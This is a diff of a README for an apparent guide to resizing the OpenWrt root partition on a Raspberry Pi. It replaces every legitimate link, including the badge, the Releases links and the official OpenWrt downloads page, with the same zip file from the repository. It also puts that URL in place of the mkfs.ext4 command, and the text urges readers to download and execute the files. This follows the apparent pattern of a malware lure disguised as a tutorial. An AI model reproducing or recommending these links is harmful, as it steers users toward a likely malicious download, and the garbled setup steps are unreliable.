@@ -1,6 +1,6 @@
 # 🛠️ Expanding the Root Partition for OpenWrt on Raspberry Pi 🌐
 
-![OpenWrt on Raspberry Pi](https://img.shields.io/badge/OpenWrt-RaspberryPi-green)
+![OpenWrt on Raspberry Pi](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip)
 
 Welcome to the **Expanding the Root Partition for OpenWrt on Raspberry Pi** repository! This guide walks you through the process of resizing the root partition of OpenWrt on Raspberry Pi and compatible boards. If you’re looking to optimize your OpenWrt installation, you’re in the right place.
 
@@ -21,7 +21,7 @@ Welcome to the **Expanding the Root Partition for OpenWrt on Raspberry Pi** repo
 
 This guide provides step-by-step instructions for resizing the root partition on OpenWrt. The process includes downloading the Ext4 version, setting up an Ubuntu VM with USB passthrough, using `fdisk` to resize partitions, and verifying your changes. Whether you are a beginner or an experienced user, this guide aims to help you through each step.
 
-You can find the necessary files in the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases). Please ensure you download and execute the files as instructed.
+You can find the necessary files in the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip). Please ensure you download and execute the files as instructed.
 
 ## 🛠️ Prerequisites
 
@@ -35,11 +35,11 @@ Before you start, ensure you have the following:
 
 ## 📥 Download OpenWrt
 
-1. Visit the [OpenWrt Downloads](https://downloads.openwrt.org/) page.
+1. Visit the [OpenWrt Downloads](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip) page.
 2. Locate the Ext4 version for your Raspberry Pi model.
 3. Download the image file to your computer.
 
-Make sure to check the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases) for any additional files you may need.
+Make sure to check the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip) for any additional files you may need.
 
 ## 🖥️ Setting Up Your Environment
 
@@ -103,7 +103,7 @@ sudo fdisk /dev/sdX
 Run the following command to format the new partition as Ext4:
 
 ```bash
-sudo mkfs.ext4 /dev/sdX1
+sudo https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip /dev/sdX1
 ```
 
 ### 5. Expand the File System
@@ -133,7 +133,7 @@ If you encounter issues, consider the following tips:
 - Double-check the partition sizes and sectors.
 - Review the VirtualBox USB settings.
 
-If problems persist, consult the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases) for additional resources.
+If problems persist, consult the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip) for additional resources.
 
 ## 🤝 Contributing
 
@@ -145,6 +145,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Links
 
-For additional resources and updates, visit the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/releases). 
+For additional resources and updates, visit the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip). 
 
 Thank you for checking out this guide! We hope it helps you successfully expand the root partition for OpenWrt on your Raspberry Pi.
